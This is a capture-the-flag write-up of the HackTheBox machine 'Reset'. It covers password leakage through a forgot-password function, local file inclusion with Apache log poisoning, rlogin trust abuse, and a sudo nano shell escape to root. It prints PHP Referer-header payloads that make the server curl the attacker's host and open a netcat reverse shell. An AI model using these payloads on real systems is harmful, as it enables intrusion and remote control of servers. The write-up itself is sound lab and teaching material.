# [HackTheBox - Reset](https://app.hackthebox.com/machines/Reset)

![c794eb831da4ecd97534b8be9550a10b.png](/resources/c794eb831da4ecd97534b8be9550a10b.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access via log poisoning](#initial-access-via-log-poisoning)
- [Privilege Escalation to sadm via rlogin](#privilege-escalation-to-sadm-via-rlogin)
- [Privilege Escalation to root via SUDO and tmux session](#privilege-escalation-to-root-via-sudo-and-tmux-session)

***
## Abstract
Data is a vulnlab machine imported to HackTheBox as an Easy Linux box, I started with network enumeration with nmap, revealing this machine is a running SSH, website and several exposed port for rexec,rlogin and rshell.

I started with web exploitation on port 80 by leveraging forgot password funtionality to find valid user and obtain new password from the website to get access to the dashboard as admin user.

The dashboard is designed for administrator to monitor authentication and syslog on the box which I use LFI vulnerability to get foothold as www-data by poisoning the access log.

After gaining a foothold, I discovered that sadm is a trusted host from `/etc/hosts.equiv` so I created this user on my machine and access to the box with sadm user without a password as trusted host.

The sadm user has 1 running tmux session that contains password of this user, sadm user can use SUDO to real log via `tail` and edit filewall script with `nano` so I used sudo with nano and escape it by spawning a shell a root and root the box.

## Enumeration

I began my initial Nmap scan using the `-sCV` flags to perform a service/version detection and script scan. Since I didn’t expect many open ports on a typical Linux host, I started with this option right away. The results revealed several services: SSH on port 22, an Apache web server on port 80, and a few legacy r-services (rlogin, rexec, and rsh) running on ports 513, 512, and 514 respectively.

![4f6957247651d18ff57a1c294cb6b1a5.png](/resources/4f6957247651d18ff57a1c294cb6b1a5.png)

I start digging into the website first which display an admin login page and from the Wappalyzer, I can see that this website is running PHP (as it should with apache hosting)

![371cac17c6bf382ebf082eb6138eaf8a.png](/resources/371cac17c6bf382ebf082eb6138eaf8a.png)

I try to identify if I could find a quick way in with root:root or admin:admin but the error message does not tell me anything useful here.

![d624e44c505b01f24f8ffeb3fece9947.png](/resources/d624e44c505b01f24f8ffeb3fece9947.png)

Then I use feroxbuster to find any hidden directory that was not supposed to be exposed but sadly I can only interact with login page and forget password function only.

![6822e3377198c65933a784ddf4d89f49.png](/resources/6822e3377198c65933a784ddf4d89f49.png)

Next I test the forgot password to see if I can abuse it which I found that the error messge can exposed the existing user so I'll keep abusing it until i get the right one.

![788283b689ebf91a4c800c2dd7281e6b.png](/resources/788283b689ebf91a4c800c2dd7281e6b.png)

Then I discover that an "admin" user is exist so what next?

![22bd68419f3ce9519d77eca6a789649b.png](/resources/22bd68419f3ce9519d77eca6a789649b.png)

I use burpsuite to see the response from the server and to my surprise, the server response back with JSON to displayed to the user and the password is one of them.

![3caa9c871c430be1703d2a4877251f77.png](/resources/3caa9c871c430be1703d2a4877251f77.png)

By abusing forget password function, I can finally login into the website but there is only 2 thing I can do on this page here. first is to select log file and second is to click view log so the website was made to just view the log file only.

![9203e27aa4bb850d3f47368950328771.png](/resources/9203e27aa4bb850d3f47368950328771.png)

There are only syslog and `auth.log` I can click to view but both log are empty which is weird.. maybe there is a cleanup script to clean up the log?

![94b491de76bd88709ddb7eb5a54c0986.png](/resources/94b491de76bd88709ddb7eb5a54c0986.png)

Using burpsuite to intercept request again and I found that when I cllick "View Logs" button, the POST request will be sent with the `file` parameter in the body and this got me thinking, maybe I can exploit LFI here?

![ecf452437cdd1997bc599641e2cfa808.png](/resources/ecf452437cdd1997bc599641e2cfa808.png)

I try to read the `/etc/passwd` file first but it look like there is some filter that only allowed me to specify file within the `/var/log` directory only.

![3f54dfe612717a6565bd7133b53b6671.png](/resources/3f54dfe612717a6565bd7133b53b6671.png)

Since I know that this website is running with Apache so I try to view the content of the web log file at `/var/log/apache2/access.log` and to my surprise, I can really view this log and I noticed that there is not much content in this log file which I can now confirm that it should be a cleanup script to clear the log file. why? because I will abuse it to get a foothold soon!

![ec68c32140a31ccf3354ba8eda4f3252.png](/resources/ec68c32140a31ccf3354ba8eda4f3252.png)

## Initial Access via log poisoning

Since I know that I can view `access.log` file which I can control it by sending whatever request to be logged and there is a possibility that this website is using `include()` to read the log file which mean Remote File Inclusion via Log Poisoning is a valid way to get a foothold on this box since when the server read the log then it will execute PHP script we could embeded in the `access.log` file or even use PHP `exec` to execute SYSTEM command on the box.

There is couple of way to abuse this since there are 2 HTTP header that I can manipulate with php script which are "Referer" and "User-Agent"

![0441d14987fba4ea213734ef1df4f0dc.png](/resources/0441d14987fba4ea213734ef1df4f0dc.png)

Thanks for the image: https://contabo.com/blog/apache-logs-a-comprehensive-guide-to-viewing-and-analyzing-on-hosting-accounts/

To confirm this, I edit Referer in HTTP GET request like this to fetch the non-existing file from my machine. 

```
Referer: <?php exec('curl http://10.10.14.74:80/whatevernotmatter'); ?>
```
![9e1a16f92aa87fb7fdfbb7312e053777.png](/resources/9e1a16f92aa87fb7fdfbb7312e053777.png)

Now after successfully poisoned the log, I send the POST request again to view the `access.log file`.

![061fbaf33a3cd7ba515b902145b65e30.png](/resources/061fbaf33a3cd7ba515b902145b65e30.png)

I can see that the server really executed curl command to fetch non-existing file on my machine so It is the time to get a foothold.

![168d518f137fec139a3038eb710050ea.png](/resources/168d518f137fec139a3038eb710050ea.png)

This time I will use busybox and netcat to connect to my reverse shell listener (penelope) that I set up on port 4444.

```
Referer: <?php exec('busybox nc 10.10.14.74 4444 -e bash'); ?>
```
![84d108bb0c6d87d9b79fe3f9747c7ae0.png](/resources/84d108bb0c6d87d9b79fe3f9747c7ae0.png)

After sending POST request again, Now I got a foothold on the box as www-data user.

![e8c5b2145c004d405be721663ee01410.png](/resources/e8c5b2145c004d405be721663ee01410.png)

The user flag is located inside the home directory of sadm user.

![d67db80e9698aebe9f0b4e61eadb1be7.png](/resources/d67db80e9698aebe9f0b4e61eadb1be7.png)

An alternative header that we can poison is "user-agent" header and multiple payload can work together from the same `access.log` file as shown in the image below.

![90885cf881c5844ad14c40e95228d90e.png](/resources/90885cf881c5844ad14c40e95228d90e.png)

![b2f687c31c3ef5722b2d31c1d9b4bfcf.png](/resources/b2f687c31c3ef5722b2d31c1d9b4bfcf.png)

## Privilege Escalation to sadm via rlogin

After gaining a foothold, I discover that sadm is a trusted host and user on this box, and what we could do about it?

![34e16fcec587b785a3f970d85cecb5d9.png](/resources/34e16fcec587b785a3f970d85cecb5d9.png)

>The `/etc/hosts.equiv` file contains a list of trusted hosts for a remote system, one per line. If a user attempts to log in remotely (using `rlogin`) from one of the hosts listed in this file, and if the remote system can access the user's password entry, the remote system allows the user to log in **without a password**.

So to put it simply, I can create a new user called "sadm" on my machine then use that user to connect to the box again via `rlogin` then I should be able to get access to the box as "sadm" user without a password.

```
sudo useradd sadm
sudo passwd sadm
su sadm
```
![22195c6aae0d6f7cc55d6d319b74d488.png](/resources/22195c6aae0d6f7cc55d6d319b74d488.png)

After creating a new user under the name of "sadm", I connect to the box again and as we can see from the image below that I successfully gained access to the box as "sadm" via rlogin.

```
rlogin reset.vl
```
![38d7814406fccbe1c377761c3ba10566.png](/resources/38d7814406fccbe1c377761c3ba10566.png)

## Privilege Escalation to root via SUDO and tmux session

During the enumeration on the box, I discover that "sadm" have 1 tmux session opened.

```
sadm@reset:~$ tmux ls
sadm_session: 1 windows (created Thu Oct 23 12:56:00 2025)
```

After checking what's inside this session, I discover the usage of sudo to modify `/etc/firewall.sh` file with nano and the user even pipe the password in unsecure way. which MEAN I can use this password to spawn a shell as root in nano with sudo!

```
tmux a -t sadm_session
```
![38330fe63bcab383d25a1eff72f73aec.png](/resources/38330fe63bcab383d25a1eff72f73aec.png)

But in fact, I do not need to use this password at all since inside tmux, new panes/windows all share that same TTY context, so the sudo command inside tmux will see the cached authentication and not ask again. as seen that I can run `sudo -l` command without prompting for a password.

![906f1030b8d2a15cef97c385a09e2058.png](/resources/906f1030b8d2a15cef97c385a09e2058.png)

Nano is very well-known linux lolbin that can be abused to spawn escalated shell via SUDO or SETUID according to [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) , so by executing nano with sudo then type Ctrl + R to switch to search mode and Ctrl + X to switch to execution mode then I can run bash shell from it as root. 

![87ffe26d3bd30da809705c4aee869a7c.png](/resources/87ffe26d3bd30da809705c4aee869a7c.png)

Following the instruction, I now have a root shell.

![1f5ffd3fbb549b9de0104d82c41c1741.png](/resources/1f5ffd3fbb549b9de0104d82c41c1741.png)

Grab the root flag and root the box!

![b9544675a1c897dd68a8242df572d22d.png](/resources/b9544675a1c897dd68a8242df572d22d.png)

![f333af1b84855e52c1287e22d2f7edec.png](/resources/f333af1b84855e52c1287e22d2f7edec.png)

https://labs.hackthebox.com/achievement/machine/1438364/680
***